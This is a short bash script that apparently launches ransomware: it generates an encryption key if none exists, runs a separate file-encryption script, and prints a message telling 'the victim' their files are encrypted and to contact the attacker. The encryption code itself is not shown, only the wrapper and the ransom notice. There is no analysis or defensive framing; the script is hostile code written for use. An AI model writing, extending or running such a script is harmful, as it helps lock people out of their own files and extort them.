#!/bin/bash

# Check if encryption key exists
if [ ! -f "secret.key" ]; then
    echo "Generating encryption key..."
    python3 generate_key.py
fi

# Run encryption script
python3 encrypt_files.py

# Notify the victim
echo "Your files have been encrypted! Contact attacker to restore them."
